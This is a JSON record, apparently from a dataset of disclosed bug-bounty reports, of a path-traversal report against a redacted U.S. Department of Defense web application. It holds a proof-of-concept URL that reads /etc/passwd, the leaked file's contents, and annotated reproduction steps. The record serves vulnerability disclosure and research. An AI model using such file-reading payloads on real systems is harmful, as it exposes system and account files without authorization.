@@ -1,0 +1,38 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "exploitmsf ",
+    "title": "lfi in filePathDownload parameter via \u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+    "content": "\nhi i found critcal lfi vulnerability\npoc: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=/etc/passwd\nresponse:\nCode 1.76 KiB\n1root:x:0:0:root:/root:/bin/bash\n2bin:x:1:1:bin:/bin:/sbin/nologin\n3daemon:x:2:2:daemon:/sbin:/sbin/nologin\n4adm:x:3:4:adm:/var/adm:/sbin/nologin\n5lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n6sync:x:5:0:sync:/sbin:/bin/sync\n7shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n8halt:x:7:0:halt:/sbin:/sbin/halt\n9mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n10operator:x:11:0:operator:/root:/sbin/nologin\n11ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\n12nobody:x:99:99:Nobody:/:/sbin/nologin\n13systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\n14dbus:x:81:81:System message bus:/:/sbin/nologin\n15polkitd:x:999:998:User for polkitd:/:/sbin/nologin\n16postfix:x:89:89::/var/spool/postfix:/sbin/nologin\n17sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\n18chrony:x:998:995::/var/lib/chrony:/sbin/nologin\n19ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash\n20saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin\n21mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\n22smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\n23sssd:x:995:993:User for sssd:/:/sbin/nologin\n24rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n25ntp:x:38:38::/etc/ntp:/sbin/nologin\n26rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n27nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n28sustainment:x:1001:1001::/home/sustainment:/bin/bash\n29emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash\n30cwagent:x:993:992::/home/cwagent:/bin/bash\n31ssm-user:x:1003:1004::/home/ssm-user:/bin/bash\n32apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n33tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\n34drupal:x:1004:1005::/home/drupal:/bin/bash\n35splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash\n36mfe:x:992:1007::/home/mfe:/sbin/nologin\nImpact\nattacker can read any file in system\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nall poc in Description\nSuggested Mitigation/Remediation Actions\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1651255440,
+    "report_url": "https://hackerone.com/reports/1542734",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Access the vulnerable URL: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=/etc/passwd"
+        ],
+        [
+            2,
+            "Observe the response containing the contents of /etc/passwd"
+        ]
+    ],
+    "vuln_description": "This is a Local File Inclusion (LFI) vulnerability in the filePathDownload parameter, allowing an attacker to read any file on the system by manipulating the parameter to include arbitrary file paths.",
+    "reason": "The vulnerability is straightforward to discover as it involves a direct manipulation of a single parameter to access system files, without requiring any complex interactions or state manipulations.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
